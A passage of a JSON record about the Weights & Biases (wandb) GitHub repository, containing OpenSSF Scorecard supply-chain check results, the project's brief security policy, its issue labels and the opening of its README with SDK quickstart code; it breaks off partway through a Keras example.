                        "Info: wandb contributor org/company found, weights and biases contributor org/company found, dessn contributor org/company found, ZwickyTransientFacility contributor org/company found, skyportal contributor org/company found, zuds-survey contributor org/company found, crowdflower.com contributor org/company found, weights & biases contributor org/company found, w&b contributor org/company found, AI-ON contributor org/company found, KSP-KOS contributor org/company found, fritz-marshal contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 12 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 2 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/build-launch-agent.yml:21"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-launch-agent.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/build-launch-agent.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build-launch-agent.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/build-launch-agent.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/check-pr-title.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/check-pr-title.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:72: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/codeql-analysis.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/generate-docodile-documentation.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/generate-docodile-documentation.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/generate-docodile-documentation.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/generate-docodile-documentation.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pre-commit.yml:12: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/pre-commit.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pre-commit.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/pre-commit.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pre-commit.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/pre-commit.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pre-commit.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/pre-commit.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-launch-agent.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-launch-agent.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-launch-agent.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-launch-agent.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:406: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:413: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:423: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:429: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:466: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:479: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:78: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:97: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:105: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:128: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:147: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:156: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:167: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:176: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:226: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:344: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:374: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:379: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:505: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:236: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:241: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:255: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:265: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:270: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:280: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:297: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:302: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-sdk.yml:311: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/release-sdk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/rust.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/rust.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/rust.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/rust.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/rust.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/rust.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/rust.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/wandb/wandb/rust.yml/main?enable=pin",
                        "Warn: containerImage not pinned by hash: core/scripts/build/Dockerfile:1: pin your Docker image by updating nvidia/cuda:12.2.0-runtime-ubuntu20.04 to nvidia/cuda:12.2.0-runtime-ubuntu20.04@sha256:44fdb25dd06bd5ee04688986a25cae1176096277bbec4a62c145fda0a8db913e",
                        "Warn: containerImage not pinned by hash: tools/launch/build/Dockerfile:1: pin your Docker image by updating python:3.9-slim-bullseye to python:3.9-slim-bullseye@sha256:fb7557928185bbaeacd0f29948b9172ffe662ade19cacad1e0a4579ffcc91707",
                        "Warn: containerImage not pinned by hash: tools/launch/release/Dockerfile:3",
                        "Warn: containerImage not pinned by hash: wandb/sdk/launch/sweeps/Dockerfile.scheduler.sweep:1: pin your Docker image by updating python:3.9-slim-bullseye to python:3.9-slim-bullseye@sha256:fb7557928185bbaeacd0f29948b9172ffe662ade19cacad1e0a4579ffcc91707",
                        "Warn: pipCommand not pinned by hash: tools/launch/build/Dockerfile:23-24",
                        "Warn: pipCommand not pinned by hash: tools/launch/build/Dockerfile:23-24",
                        "Warn: pipCommand not pinned by hash: wandb/sdk/launch/sweeps/Dockerfile.scheduler.sweep:12",
                        "Warn: goCommand not pinned by hash: core/api/proto/generate-proto.sh:10",
                        "Warn: downloadThenRun not pinned by hash: core/scripts/install-golangci-lint.sh:2",
                        "Warn: goCommand not pinned by hash: core/vendor/github.com/go-git/go-git/v5/oss-fuzz.sh:20",
                        "Warn: pipCommand not pinned by hash: wandb/docker/wandb-entrypoint.sh:14",
                        "Warn: pipCommand not pinned by hash: wandb/docker/wandb-entrypoint.sh:23",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pre-commit.yml:22",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-sdk.yml:351",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-sdk.yml:383",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-sdk.yml:42",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-sdk.yml:59",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-sdk.yml:276",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-sdk.yml:435",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-sdk.yml:501",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-sdk.yml:502",
                        "Warn: pipCommand not pinned by hash: .github/workflows/rust.yml:26",
                        "Info:   0 out of  34 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  15 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   4 containerImage dependencies pinned",
                        "Info:   0 out of  15 pipCommand dependencies pinned",
                        "Info:   2 out of   4 goCommand dependencies pinned",
                        "Info:   0 out of   1 downloadThenRun dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 20 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 8,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v0.18.5 not signed: https://api.github.com/repos/wandb/wandb/releases/180548590",
                        "Warn: release artifact v0.18.4 not signed: https://api.github.com/repos/wandb/wandb/releases/180537728",
                        "Warn: release artifact v0.18.3 not signed: https://api.github.com/repos/wandb/wandb/releases/177906992",
                        "Warn: release artifact v0.18.2 not signed: https://api.github.com/repos/wandb/wandb/releases/177366135",
                        "Warn: release artifact v0.18.1 not signed: https://api.github.com/repos/wandb/wandb/releases/175326205",
                        "Warn: release artifact v0.18.5 does not have provenance: https://api.github.com/repos/wandb/wandb/releases/180548590",
                        "Warn: release artifact v0.18.4 does not have provenance: https://api.github.com/repos/wandb/wandb/releases/180537728",
                        "Warn: release artifact v0.18.3 does not have provenance: https://api.github.com/repos/wandb/wandb/releases/177906992",
                        "Warn: release artifact v0.18.2 does not have provenance: https://api.github.com/repos/wandb/wandb/releases/177366135",
                        "Warn: release artifact v0.18.1 does not have provenance: https://api.github.com/repos/wandb/wandb/releases/175326205"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:28",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:29",
                        "Warn: no topLevel permission defined: .github/workflows/build-launch-agent.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/check-pr-title.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/generate-docodile-documentation.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/pre-commit.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-launch-agent.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-sdk.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/rust.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-q445-7m23-qrmw",
                        "Warn: Project is vulnerable to: RUSTSEC-2024-0357"
                    ],
                    "score": 8,
                    "reason": "2 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/wandb/wandb/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Reporting a Vulnerability\n\nPlease report all vulnerabilities to security@wandb.com.\n",
        "project_all_labels": [
            "a:app",
            "a:sdk",
            "c:artifacts",
            "c:docs",
            "c:importer",
            "c:launch",
            "c:reports",
            "c:sdk:chain",
            "c:sdk:code-quality",
            "c:sdk:config",
            "c:sdk:console",
            "c:sdk:custom-charts",
            "c:sdk:define-metric",
            "c:sdk:distributed-training",
            "c:sdk:finish",
            "c:sdk:init",
            "c:sdk:integration",
            "c:sdk:internal-process",
            "c:sdk:login",
            "c:sdk:media",
            "c:sdk:public-api",
            "c:sdk:resume",
            "c:sdk:robustness",
            "c:sdk:save",
            "c:sdk:settings",
            "c:sdk:summary",
            "c:sdk:sync",
            "c:sdk:system-metrics",
            "c:sdk:table",
            "c:sdk:tensorboard",
            "c:sdk:ux",
            "c:sdk:watch",
            "c:sweeps",
            "c:weave",
            "contrib",
            "dependencies",
            "github_actions",
            "go",
            "rust",
            "s:debugging",
            "s:duplicate",
            "s:nexus-fix",
            "s:not-yet-reproduced",
            "s:reproduced",
            "s:solved",
            "s:wait-on-user",
            "s:wont-fix",
            "s:workaround",
            "ty:bug",
            "ty:feature",
            "ty:question"
        ],
        "README_content": "<p align=\"center\">\n  <img src=\"./assets/logo-dark.svg#gh-dark-mode-only\" width=\"600\" alt=\"Weights & Biases\" />\n  <img src=\"./assets/logo-light.svg#gh-light-mode-only\" width=\"600\" alt=\"Weights & Biases\" />\n</p>\n\n<p align=\"center\">\n<a href=\"https://pypi.python.org/pypi/wandb\"><img src=\"https://img.shields.io/pypi/v/wandb\" /></a>\n<a href=\"https://anaconda.org/conda-forge/wandb\"><img src=\"https://img.shields.io/conda/vn/conda-forge/wandb\" /></a>\n<a href=\"https://circleci.com/gh/wandb/wandb\"><img src=\"https://img.shields.io/circleci/build/github/wandb/wandb/main\" /></a>\n<a href=\"https://codecov.io/gh/wandb/wandb\"><img src=\"https://img.shields.io/codecov/c/gh/wandb/wandb\" /></a>\n</p>\n<p align='center'>\n<a href=\"https://colab.research.google.com/github/wandb/examples/blob/master/colabs/intro/Intro_to_Weights_%26_Biases.ipynb\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" /></a>\n</p>\n\nUse W&B to build better models faster. Track and visualize all the pieces of your machine learning pipeline, from datasets to production machine learning models. Get started with W&B today, [sign up for a W&B account!](https://wandb.com?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme)\n\n<br>\n\nBuilding an LLM app? Track, debug, evaluate, and monitor LLM apps with [Weave](https://wandb.github.io/weave?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme), our new suite of tools for GenAI.\n\n&nbsp;\n\n# Documentation\n\n<p align='center'>\n<a target=\"_blank\" href=\"https://docs.wandb.ai/guides/track?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme\">\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"./assets/Product_Icons_dark_background/experiments-dark.svg\" width=\"14.0%\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"./assets/Product_Icons_light/experiments-light.svg\" width=\"14.0%\">\n  <img alt=\"Weights and Biases Experiments\" src=\"\">\n</picture>\n</a>\n<a target=\"_blank\" href=\"https://docs.wandb.ai/guides/reports?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme\">\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"./assets/Product_Icons_dark_background/reports-dark.svg\" width=\"14.0%\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"./assets/Product_Icons_light/reports-light.svg\" width=\"14.0%\">\n  <img alt=\"Weights and Biases Reports\" src=\"\">\n</picture>\n</a>\n<a target=\"_blank\" href=\"https://docs.wandb.ai/guides/artifacts?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme\">\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"./assets/Product_Icons_dark_background/artifacts-dark.svg\" width=\"14.0%\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"./assets/Product_Icons_light/artifacts-light.svg\" width=\"14.0%\">\n  <img alt=\"Weights and Biases Artifacts\" src=\"\">\n</picture>\n</a>\n<a target=\"_blank\" href=\"https://docs.wandb.ai/guides/tables?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme\">\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"./assets/Product_Icons_dark_background/tables-dark.svg\" width=\"14.0%\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"./assets/Product_Icons_light/tables-light.svg\" width=\"14.0%\">\n  <img alt=\"Weights and Biases Tables\" src=\"\">\n</picture>\n</a>\n<a target=\"_blank\" href=\"https://docs.wandb.ai/guides/sweeps?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme\">\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"./assets/Product_Icons_dark_background/sweeps-dark.svg\" width=\"14.0%\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"./assets/Product_Icons_light/sweeps-light.svg\" width=\"14.0%\">\n  <img alt=\"Weights and Biases Sweeps\" src=\"\">\n</picture>\n</a>\n<a target=\"_blank\" href=\"https://docs.wandb.ai/guides/launch?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme\">\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"./assets/Product_Icons_dark_background/launch-dark.svg\" width=\"14.0%\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"./assets/Product_Icons_light/launch-light.svg\" width=\"14.0%\">\n  <img alt=\"Weights and Biases Launch\" src=\"\">\n</picture>\n</a>\n<a target=\"_blank\" href=\"https://docs.wandb.ai/guides/model_registry?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme\">\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"./assets/Product_Icons_dark_background/model-registry-dark.svg\" width=\"14.0%\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"./assets/Product_Icons_light/model-registry-light.svg\" width=\"14.0%\">\n  <img alt=\"Weights and Biases Model Management\" src=\"\">\n</picture>\n</a>\n<a target=\"_blank\" href=\"https://docs.wandb.ai/guides/artifacts/project-scoped-automations?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=readme\">\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"./assets/Product_Icons_dark_background/automations-dark.svg\" width=\"14.0%\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"./assets/Product_Icons_light/automations-light.svg\" width=\"14.0%\">\n  <img alt=\"Weights and Biases Prompts\" src=\"\">\n</picture>\n</p>\n\nSee the [W&B Developer Guide](https://docs.wandb.ai/?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=documentation) and [API Reference Guide](https://docs.wandb.ai/ref?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=documentation) for a full technical description of the W&B platform.\n\n# Quickstart\n\nGet started with W&B in four steps:\n\n1. First, sign up for a [W&B account](https://wandb.ai/login?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=quickstart).\n\n2. Second, install the W&B SDK with [pip](https://pip.pypa.io/en/stable/). Navigate to your terminal and type the following command:\n\n```bash\npip install wandb\n```\n\n3. Third, log into W&B:\n\n```python\nwandb.login()\n```\n\n4. Use the example code snippet below as a template to integrate W&B to your Python script:\n\n```python\nimport wandb\n\n# Start a W&B Run with wandb.init\nrun = wandb.init(project=\"my_first_project\")\n\n# Save model inputs and hyperparameters in a wandb.config object\nconfig = run.config\nconfig.learning_rate = 0.01\n\n# Model training code here ...\n\n# Log metrics over time to visualize performance with wandb.log\nfor i in range(10):\n    run.log({\"loss\": ...})\n\n# Mark the run as finished, and finish uploading all data\nrun.finish()\n```\n\nThat's it! Navigate to the W&B App to view a dashboard of your first W&B Experiment. Use the W&B App to compare multiple experiments in a unified place, dive into the results of a single run, and much more!\n\n<p align='center'>\n<img src=\"./assets/wandb_demo_experiments.gif\" width=\"100%\">\n</p>\n<p align = \"center\">\nExample W&B Dashboard that shows Runs from an Experiment.\n</p>\n\n&nbsp;\n\n# Integrations\n\nUse your favorite framework with W&B. W&B integrations make it fast and easy to set up experiment tracking and data versioning inside existing projects. For more information on how to integrate W&B with the framework of your choice, see the [Integrations chapter](https://docs.wandb.ai/guides/integrations) in the W&B Developer Guide.\n\n<!-- <p align='center'>\n<img src=\"./assets/integrations.png\" width=\"100%\" />\n</p> -->\n\n<details>\n<summary>🔥 PyTorch</summary>\n\nCall `.watch` and pass in your PyTorch model to automatically log gradients and store the network topology. Next, use `.log` to track other metrics. The following example demonstrates an example of how to do this:\n\n```python\nimport wandb\n\n# 1. Start a new run\nrun = wandb.init(project=\"gpt4\")\n\n# 2. Save model inputs and hyperparameters\nconfig = run.config\nconfig.dropout = 0.01\n\n# 3. Log gradients and model parameters\nrun.watch(model)\nfor batch_idx, (data, target) in enumerate(train_loader):\n    ...\n    if batch_idx % args.log_interval == 0:\n        # 4. Log metrics to visualize performance\n        run.log({\"loss\": loss})\n```\n\n- Run an example [Google Colab Notebook](http://wandb.me/pytorch-colab).\n- Read the [Developer Guide](https://docs.wandb.com/guides/integrations/pytorch?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations) for technical details on how to integrate PyTorch with W&B.\n- Explore [W&B Reports](https://app.wandb.ai/wandb/getting-started/reports/Pytorch--VmlldzoyMTEwNzM?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations).\n\n</details>\n<details>\n<summary>🌊 TensorFlow/Keras</summary>\nUse W&B Callbacks to automatically save metrics to W&B when you call `model.fit` during training.\n\nThe following code example demonstrates how your script might look like when you integrate W&B with Keras:\n\n```python\n# This script needs these libraries to be installed:\n#   tensorflow, numpy\n\nimport wandb\nfrom wandb.keras import WandbMetricsLogger, WandbModelCheckpoint\n\nimport random\nimport numpy as np\nimport tensorflow as tf\n\n\n# Start a run, tracking hyperparameters\nrun = wandb.init(\n    # set the wandb project where this run will be logged\n    project=\"my-awesome-project\",\n    # track hyperparameters and 